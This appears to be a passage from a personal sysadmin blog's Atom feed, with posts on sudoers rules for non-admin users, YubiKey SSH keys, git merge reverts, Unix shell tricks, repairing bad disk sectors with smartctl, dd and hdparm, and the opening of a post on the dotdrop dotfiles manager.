<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>deadc0de.re</title><link href="https://deadc0de.re/" rel="alternate"></link><link href="https://deadc0de.re/feeds/all.atom.xml" rel="self"></link><id>https://deadc0de.re/</id><updated>2018-08-07T00:00:00+02:00</updated><entry><title>Allow non-admin to execute sudo commands</title><link href="https://deadc0de.re/articles/sudo-for-non-admin.html" rel="alternate"></link><published>2018-08-07T00:00:00+02:00</published><updated>2018-08-07T00:00:00+02:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2018-08-07:/articles/sudo-for-non-admin.html</id><summary type="html">&lt;p&gt;Allow non-admin users to execute sudo commands&lt;/p&gt;</summary><content type="html">&lt;p&gt;It is sometimes useful to allow non-admin users to
execute commands that normally require the use of &lt;code&gt;sudo&lt;/code&gt; for example to reload nginx or to
execute specific &lt;code&gt;systemctl&lt;/code&gt; command. It is especially useful for CI/CD.&lt;/p&gt;
&lt;p&gt;This is easily doable with &lt;code&gt;visudo&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Start by adding a new sudoer file with&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo visudo -f /etc/sudoers.d/&amp;lt;some-meaningful-name&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note that the filename cannot contain dots or tilds.&lt;/p&gt;
&lt;p&gt;Adding your file under &lt;code&gt;/etc/sudoers.d/&lt;/code&gt; ensures no bad surprise will arise
when your distribution will change the &lt;code&gt;/etc/sudoers&lt;/code&gt; file due to system upgrades.&lt;/p&gt;
&lt;p&gt;All files in &lt;code&gt;/etc/sudoers.d/&lt;/code&gt; are loaded by the last line of &lt;code&gt;/etc/sudoers&lt;/code&gt;
(which is not a comment btw):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#includedir /etc/sudoers.d
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's say you want the user &lt;em&gt;web&lt;/em&gt; to be able to reload nginx config&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Cmnd_Alias RELOADNGINX = /bin/systemctl reload nginx
web ALL=(ALL) NOPASSWD: RELOADNGINX
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The same can be done for a group by prepending the group
name with a &lt;code&gt;%&lt;/code&gt; for example&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;%webgroup&lt;/span&gt; &lt;span class="n"&gt;ALL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;ALL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="nl"&gt;NOPASSWD&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;RELOADNGINX&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Also multiple commands can be added by separating them with a comma,
here user &lt;em&gt;web&lt;/em&gt; would be able to stop and start nginx.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Cmnd_Alias RESTART = /bin/systemctl stop nginx,/bin/systemctl start nginx
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;To check what has been added is valid, run &lt;code&gt;sudo visudo --check&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Once saved and written, user &lt;em&gt;web&lt;/em&gt; will be able to execute
the command &lt;code&gt;sudo systemctl restart nginx&lt;/code&gt; without any password.&lt;/p&gt;
&lt;p&gt;For more on visudo, see &lt;a href="https://manpage.me/?q=visudo"&gt;man visudo&lt;/a&gt;
and the following blogposts:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://toroid.org/sudoers-syntax"&gt;http://toroid.org/sudoers-syntax&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.garron.me/en/linux/visudo-command-sudoers-file-sudo-default-editor.html"&gt;https://www.garron.me/en/linux/visudo-command-sudoers-file-sudo-default-editor.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="unix"></category><category term="sudo"></category><category term="cli"></category></entry><entry><title>YubiKey SSH key instead of local key</title><link href="https://deadc0de.re/articles/yubikey-ssh.html" rel="alternate"></link><published>2018-08-07T00:00:00+02:00</published><updated>2018-08-07T00:00:00+02:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2018-08-07:/articles/yubikey-ssh.html</id><summary type="html">&lt;p&gt;Using the SSH key in the YubiKey along with other SSH keys&lt;/p&gt;</summary><content type="html">&lt;p&gt;When using a &lt;a href="https://www.yubico.com/products/yubikey-hardware/"&gt;YubiKey&lt;/a&gt; for SSH, it is sometimes
useful to be able to choose which key to use: a local SSH key (defaults to &lt;code&gt;~/.ssh/id_rsa&lt;/code&gt;)
or the one on the YubiKey.&lt;/p&gt;
&lt;p&gt;The common way of selecting a specific SSH key with &lt;code&gt;ssh&lt;/code&gt; is to specify it with the &lt;code&gt;-i&lt;/code&gt; switch:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssh -i ~/.ssh/id_rsa user@somehost
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Or for example for cloning a repository:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nv"&gt;GIT_SSH_COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ssh -i ~/.ssh/id_rsa&amp;#39;&lt;/span&gt; git clone git@&amp;lt;somehost&amp;gt;:&amp;lt;someuser&amp;gt;/&amp;lt;somerepo&amp;gt;.git
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Another solution would be to insert this config in &lt;code&gt;~/.ssh/config&lt;/code&gt;, for example&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Host &amp;lt;somehost&amp;gt;
   IdentityFile ~/.ssh/id_rsa
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When you however want to force &lt;code&gt;ssh&lt;/code&gt; to use the SSH key from your YubiKey instead of a
local key, you'd have to specify it in some way, here's how.&lt;/p&gt;
&lt;p&gt;First extract the SSH public key from your YubiKey. Either using gpg2 with&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gpg2 --export-ssh-key &amp;lt;keyid&amp;gt; &amp;gt; ~/.ssh/id_rsa_yubi.pub
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;or through ssh-agent&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ssh-add -L &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s2"&gt;&amp;quot;cardno&amp;quot;&lt;/span&gt; &amp;gt; ~/.ssh/id_rsa_yubi.pub
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;That public key (&lt;code&gt;~/.ssh/id_rsa_yubi.pub&lt;/code&gt;) can then be used with the usual SSH switch &lt;code&gt;-i&lt;/code&gt; like
the above to force &lt;code&gt;ssh&lt;/code&gt; to use the key from your YubiKey.&lt;/p&gt;</content><category term="unix"></category><category term="yubikey"></category><category term="ssh"></category></entry><entry><title>Reverting the revert</title><link href="https://deadc0de.re/articles/git-revert.html" rel="alternate"></link><published>2017-10-18T00:00:00+02:00</published><updated>2017-10-18T00:00:00+02:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2017-10-18:/articles/git-revert.html</id><summary type="html">&lt;p&gt;be careful when reverting a merge&lt;/p&gt;</summary><content type="html">&lt;p&gt;As a reminder to myself and maybe to help others too, &lt;strong&gt;try to avoid
reverting a merge if you plan on merging it some later times !&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Let's consider an example in order to understand why this could be a problem.
First create a repository:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;mkdir repo&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; repo&lt;span class="p"&gt;;&lt;/span&gt; git init
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;master-file-1&amp;#39;&lt;/span&gt; &amp;gt; master-file-1
git add *
git commit -a -m &lt;span class="s1"&gt;&amp;#39;master-file-1&amp;#39;&lt;/span&gt;

&lt;span class="c1"&gt;# master --o--H&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now a new branch &lt;em&gt;branch&lt;/em&gt; is created and two files are added to it&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;git checkout -b branch
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;branch-file-1&amp;#39;&lt;/span&gt; &amp;gt; branch-file-1
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;branch-file-2&amp;#39;&lt;/span&gt; &amp;gt; branch-file-2
git add *
git commit -a -m &lt;span class="s1"&gt;&amp;#39;branch-file-*&amp;#39;&lt;/span&gt;

&lt;span class="c1"&gt;# master --o--H&lt;/span&gt;
&lt;span class="c1"&gt;#           \&lt;/span&gt;
&lt;span class="c1"&gt;# branch     o--H&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At this time the &lt;em&gt;branch&lt;/em&gt; branch is (supposingly) ready to be merged with master&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# now comes the merge (M)&lt;/span&gt;
git checkout master
git merge branch

&lt;span class="c1"&gt;# master --o------M--H&lt;/span&gt;
&lt;span class="c1"&gt;#           \    /&lt;/span&gt;
&lt;span class="c1"&gt;# branch     o--o&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;However for some reason the merge needs to be reverted (issue with master, unstable, not the right
time, etc)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# now comes the revert (W)&lt;/span&gt;
git revert &amp;lt;commit&amp;gt;

&lt;span class="c1"&gt;# master --o------M--W--H&lt;/span&gt;
&lt;span class="c1"&gt;#           \    /&lt;/span&gt;
&lt;span class="c1"&gt;# branch     o--o&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is not directly an error, but it could become an issue if you don't realize
what was exactly done here. A revert will actually create a new commit that is the opposite
of what was done by the merge, i.e. removing the two files that were committed in the
&lt;em&gt;branch&lt;/em&gt; branch.
Therefore the master branch's history now contains a commit that says that the two files
&lt;em&gt;branch-file-1&lt;/em&gt; and &lt;em&gt;branch-file-2&lt;/em&gt;
have been removed. This commit is more recent that the one that actually added the files in
the first place. Thus if those file are not changed, they will never be added in a future
merge.&lt;/p&gt;
&lt;p&gt;Let's see that with an example. One of the two files is updated in the &lt;em&gt;branch&lt;/em&gt; branch&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# update branch (C)&lt;/span&gt;
git checkout branch
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;some change&amp;#39;&lt;/span&gt; &amp;gt; branch-file-2
git commit -a -m &lt;span class="s1"&gt;&amp;#39;update&amp;#39;&lt;/span&gt;

&lt;span class="c1"&gt;# master --o------M--W--H&lt;/span&gt;
&lt;span class="c1"&gt;#           \    /&lt;/span&gt;
&lt;span class="c1"&gt;# branch     o--o-------C--H&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And the new version of the branch is merged&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# and re-merge (Y)&lt;/span&gt;
git checkout master
git merge branch

&lt;span class="c1"&gt;# master --o------M--W---Y--H&lt;/span&gt;
&lt;span class="c1"&gt;#           \    /      /&lt;/span&gt;
&lt;span class="c1"&gt;# branch     o--o------C--H&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now two things are happening, first a conflict arises between the two versions of the &lt;em&gt;branch-file-2&lt;/em&gt;,
the one in master that was deleted and the one from branch &lt;em&gt;branch&lt;/em&gt;  that was modified. That is expected and needs
to be fixed. The second issue, which is more problematic, is that the file &lt;em&gt;branch-file-1&lt;/em&gt; &lt;strong&gt;does not
at all (re-)appear in the master branch&lt;/strong&gt;. It makes sense since for the master branch it has been deleted
in a commit that is more recent than the one that actually created it but it might not be directly expected
without having understood exactly what the first revert did.&lt;/p&gt;
&lt;p&gt;How to fix this then and actually have &lt;strong&gt;all changes&lt;/strong&gt; from branch &lt;em&gt;branch&lt;/em&gt; being merged into master ?
Well the revert (W) needs to be reverted first and then the whole branch &lt;em&gt;branch&lt;/em&gt; re-merged in Master.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# revert the revert (X) and merge (N)&lt;/span&gt;
git checkout master
git revert &amp;lt;revert-commit&amp;gt;
git merge branch

&lt;span class="c1"&gt;# master --o------M--W--X---N--H&lt;/span&gt;
&lt;span class="c1"&gt;#           \    /         /&lt;/span&gt;
&lt;span class="c1"&gt;# branch     o--o---------C--H&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;That's it, now all changes/files brought by branch &lt;em&gt;branch&lt;/em&gt; are in master.&lt;/p&gt;
&lt;p&gt;References:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.kernel.org/pub/software/scm/git/docs/howto/revert-a-faulty-merge.txt"&gt;revert a faulty merge&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="git"></category></entry><entry><title>Unix tricks 3</title><link href="https://deadc0de.re/articles/unix-tricks-3.html" rel="alternate"></link><published>2017-09-02T00:00:00+02:00</published><updated>2017-09-02T00:00:00+02:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2017-09-02:/articles/unix-tricks-3.html</id><summary type="html">&lt;p&gt;Unix tricks 3&lt;/p&gt;</summary><content type="html">&lt;p&gt;some more neat unix tricks&lt;/p&gt;
&lt;h2&gt;scp when there are too many arguments&lt;/h2&gt;
&lt;p&gt;Sometimes you want to retrieve a lot of files from a remote location but
the expension of star (*) in bash returns the following error&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Argument list too long
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;One way of fixing it is to leverage &lt;code&gt;find&lt;/code&gt; and its nice &lt;em&gt;-exec&lt;/em&gt; switch:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ssh &amp;lt;user&amp;gt;@&amp;lt;remote-host&amp;gt; &lt;span class="s1"&gt;&amp;#39;find &amp;lt;path-where-files-are&amp;gt; -type f -name &amp;quot;&amp;lt;some-regex&amp;gt;&amp;quot; | tar czvf - --files-from -&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; tar zxvf - -C &amp;lt;local-destination&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As a reminder, following command allows to retrieve the max number of arguments
that can be passed to a command:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ getconf ARG_MAX
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Reload groups without logging out&lt;/h2&gt;
&lt;p&gt;Simple trick to avoid to log out to apply new groups&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ id
$ su - &lt;span class="nv"&gt;$USER&lt;/span&gt;
$ id
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Find file newer or older than a specific date&lt;/h2&gt;
&lt;p&gt;Create a file with the to-be-tested timestamp
(format: YYYYMMDDHHMM, see also the manpage)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ touch -t &lt;span class="m"&gt;201501010000&lt;/span&gt; /tmp/timestamp
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then query with find&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ find &amp;lt;some-path&amp;gt; -newer /tmp/timestamp
$ find &amp;lt;some-path&amp;gt; -not -newer /tmp/timestamp
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Chown symlink&lt;/h2&gt;
&lt;p&gt;How to chown a symlink&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ chown -h &amp;lt;user&amp;gt;:&amp;lt;group&amp;gt; &amp;lt;symlink&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Gateway routing&lt;/h2&gt;
&lt;p&gt;Check which gateway would be used for routing a specific
IP:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ip route get &amp;lt;IP&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Randomize-lines replacement&lt;/h2&gt;
&lt;p&gt;The package &lt;code&gt;Randomize-lines&lt;/code&gt; that provides the quite useful &lt;code&gt;rl&lt;/code&gt; for
randomizing lines has been removed in latest Ubuntu version
(Xenial and newer).&lt;/p&gt;
&lt;p&gt;A replacement for this is the &lt;code&gt;shuf&lt;/code&gt; tool.&lt;/p&gt;
&lt;p&gt;For example to retrieve a random line from a file&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ shuf -n &lt;span class="m"&gt;1&lt;/span&gt; &amp;lt;some-file&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;script duration&lt;/h2&gt;
&lt;p&gt;Ever wanted to know the duration of a specific bash script ? The
following oneliner allows to do that easily:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;date -u -d @&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SECONDS&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; +%T
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;ps tree-style&lt;/h2&gt;
&lt;p&gt;Display &lt;code&gt;ps&lt;/code&gt; output with the processes hierarchy:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ps aux --forest
&lt;/pre&gt;&lt;/div&gt;</content><category term="unix"></category><category term="cli"></category><category term="shell"></category></entry><entry><title>YubiKey</title><link href="https://deadc0de.re/articles/yubikey.html" rel="alternate"></link><published>2017-06-03T00:00:00+02:00</published><updated>2017-06-03T00:00:00+02:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2017-06-03:/articles/yubikey.html</id><summary type="html">&lt;p&gt;Yubikey FTW&lt;/p&gt;</summary><content type="html">&lt;p&gt;&lt;a href="https://www.yubico.com/products/yubikey-hardware/"&gt;YubiKey&lt;/a&gt; is a nice dongle that allows
to hold several PGP subkeys to handle authentication (like SSH for example) and PGP encryption/signature.&lt;/p&gt;
&lt;p&gt;Using it allows to considerably increase your daily workflow with U2F for online authentication,
as well as password management with &lt;a href="https://www.passwordstore.org/"&gt;pass&lt;/a&gt; or
&lt;a href="https://www.justwatch.com/gopass/"&gt;gopass&lt;/a&gt; for example.&lt;/p&gt;
&lt;p&gt;Check their video: &lt;a href="https://vimeo.com/137100978"&gt;https://vimeo.com/137100978&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I blogged on how to set it up
&lt;a href="https://research.kudelskisecurity.com/2017/04/28/configuring-yubikey-for-gpg-and-u2f/"&gt;here&lt;/a&gt;.&lt;/p&gt;</content><category term="gpg"></category><category term="ssh"></category><category term="u2f"></category></entry><entry><title>Fixing unreadable sectors</title><link href="https://deadc0de.re/articles/unreadable-sectors.html" rel="alternate"></link><published>2017-04-23T00:00:00+02:00</published><updated>2017-04-23T00:00:00+02:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2017-04-23:/articles/unreadable-sectors.html</id><summary type="html">&lt;p&gt;Fixing unreadable sectors on disk&lt;/p&gt;</summary><content type="html">&lt;p&gt;Quick reminder for myself on how to fix unreadable sectors on a disk. Doing this live is
possible on a zfs pool for example (or probably other RAID setups that have redundancy)
but otherwise it is safer to unmount the disk/partition first.&lt;/p&gt;
&lt;p&gt;Here are the errors reported by SMART:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Device: /dev/sdb &lt;span class="o"&gt;[&lt;/span&gt;SAT&lt;span class="o"&gt;]&lt;/span&gt;, &lt;span class="m"&gt;8&lt;/span&gt; Currently unreadable &lt;span class="o"&gt;(&lt;/span&gt;pending&lt;span class="o"&gt;)&lt;/span&gt; sectors
Device: /dev/sdb &lt;span class="o"&gt;[&lt;/span&gt;SAT&lt;span class="o"&gt;]&lt;/span&gt;, &lt;span class="m"&gt;8&lt;/span&gt; Offline uncorrectable sectors
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;First run a full &lt;code&gt;Extended offline&lt;/code&gt; test:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ smartctl -t long /dev/sdb
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Once the test is done, check the results:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ smartctl -a /dev/sdb
...
Sector Sizes:     &lt;span class="m"&gt;512&lt;/span&gt; bytes logical, &lt;span class="m"&gt;4096&lt;/span&gt; bytes physical
...
&lt;span class="c1"&gt;# 9  Extended offline    Completed: read failure       30%     19394         2776811256&lt;/span&gt;
....
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The bad sector then need to be zeroed out (adapt the &lt;code&gt;bs&lt;/code&gt; argument with the sector sizes
and the &lt;code&gt;seek&lt;/code&gt; with the first bad sector offset reported from the above command):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ dd &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/zero &lt;span class="nv"&gt;of&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/dev/sdb &lt;span class="nv"&gt;bs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;512&lt;/span&gt; &lt;span class="nv"&gt;count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; &lt;span class="nv"&gt;seek&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;2776811256&lt;/span&gt; &lt;span class="nv"&gt;conv&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;noerror,sync
$ sync
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Repeat the above procedure until all bad sectors have been fixed.
At the end, make sure no more bad sectors are detected with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ smartctl -A /dev/sdb &lt;span class="p"&gt;|&lt;/span&gt; grep Offline_Uncorrectable
&lt;span class="m"&gt;198&lt;/span&gt; Offline_Uncorrectable   0x0010   &lt;span class="m"&gt;100&lt;/span&gt;   &lt;span class="m"&gt;100&lt;/span&gt;   &lt;span class="m"&gt;000&lt;/span&gt;    Old_age   Offline      -       &lt;span class="m"&gt;0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;References:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://bytesandbolts.com/fixing-freenas-error-currently-unreadable-pending-sectors/"&gt;http://bytesandbolts.com/fixing-freenas-error-currently-unreadable-pending-sectors/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://linoxide.com/linux-how-to/how-to-fix-repair-bad-blocks-in-linux/"&gt;http://linoxide.com/linux-how-to/how-to-fix-repair-bad-blocks-in-linux/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://dekoder.wordpress.com/2014/10/08/fixing-freenas-currently-unreadable-pending-sectors-error/"&gt;https://dekoder.wordpress.com/2014/10/08/fixing-freenas-currently-unreadable-pending-sectors-error/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;EDIT&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;I experienced that sometimes &lt;code&gt;dd&lt;/code&gt; is unable to write to a bad sector, resulting in a similar output&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;dd: error writing ‘/dev/sdb’: Input/output error
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The workaround is to use &lt;code&gt;hdparm&lt;/code&gt; in order to fix it&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# read the bad sector to validate it is indeed bad&lt;/span&gt;
$ sudo hdparm --read-sector &lt;span class="m"&gt;2757742944&lt;/span&gt; /dev/sdb
/dev/sdb:
reading sector &lt;span class="m"&gt;2757742944&lt;/span&gt;: FAILED: Input/output error

&lt;span class="c1"&gt;# write to it&lt;/span&gt;
$ sudo hdparm --write-sector &lt;span class="m"&gt;2757742944&lt;/span&gt; --yes-i-know-what-i-am-doing /dev/sdb
/dev/sdb:
re-writing sector &lt;span class="m"&gt;2757742944&lt;/span&gt;: succeeded

&lt;span class="c1"&gt;# re-read to confirm it is fixed&lt;/span&gt;
$ sudo hdparm --read-sector &lt;span class="m"&gt;2757742944&lt;/span&gt; /dev/sdb
/dev/sdb:
reading sector &lt;span class="m"&gt;2757742944&lt;/span&gt;: succeeded
...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Smartctl then shows that one sector was reallocated:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo smartctl -a /dev/sdb &lt;span class="p"&gt;|&lt;/span&gt; grep -i reallocated
  &lt;span class="m"&gt;5&lt;/span&gt; Reallocated_Sector_Ct   0x0033   &lt;span class="m"&gt;100&lt;/span&gt;   &lt;span class="m"&gt;100&lt;/span&gt;   &lt;span class="m"&gt;010&lt;/span&gt;    Pre-fail  Always       -       &lt;span class="m"&gt;1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;References:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.sj-vs.net/forcing-a-hard-disk-to-reallocate-bad-sectors/"&gt;http://www.sj-vs.net/forcing-a-hard-disk-to-reallocate-bad-sectors/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="smart"></category><category term="zfs"></category><category term="disk"></category><category term="failure"></category></entry><entry><title>Dotfiles management with dotdrop</title><link href="https://deadc0de.re/articles/dotfiles.html" rel="alternate"></link><published>2017-03-13T00:00:00+01:00</published><updated>2017-03-13T00:00:00+01:00</updated><author><name>deadc0de</name></author><id>tag:deadc0de.re,2017-03-13:/articles/dotfiles.html</id><summary type="html">&lt;p&gt;Management of dotfiles made easy with &lt;a href="https://github.com/deadc0de6/dotdrop"&gt;dotdrop&lt;/a&gt;&lt;/p&gt;</summary><content type="html">&lt;p&gt;Managing dotfiles is a pain, especially when working on multiple
hosts (your host at home, your host in the office, your cloud VMs,
etc), I was therefore looking for a solution that would
allow me to save my dotfiles and manage them easily.&lt;/p&gt;
&lt;p&gt;If you don't know what this is about, dotfiles are
all those configuration files you keep in your $HOME usually in a hidden
file (starting with a dot, therefore &lt;em&gt;dotfile&lt;/em&gt;).&lt;/p&gt;
&lt;p&gt;There exist several smart solutions on how to save your dotfiles, here
are some solutions I almost adopted:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/anishathalye/dotbot"&gt;https://github.com/anishathalye/dotbot&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/EvanPurkhiser/dots"&gt;https://github.com/EvanPurkhiser/dots&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jaagr/dots"&gt;https://github.com/jaagr/dots&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Check the page &lt;a href="https://dotfiles.github.io/"&gt;Github does dotfiles&lt;/a&gt; for
more tools on dotfiles.&lt;/p&gt;
&lt;p&gt;Those solutions are awesome but didn't exactly match what I needed.
Here are some of the requirements I had:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I want my dotfiles to be versioned (preferably with git).&lt;/li&gt;
&lt;li&gt;I want to store each dotfile only once (no multiple repositories,
    no duplicate, ...).&lt;/li&gt;
&lt;li&gt;I want to be able to easily compare my local version with
    the stored one.&lt;/li&gt;
&lt;li&gt;I want my management tool to handle multiple profiles (for different
    hosts: home, desktop, VM, ...).&lt;/li&gt;
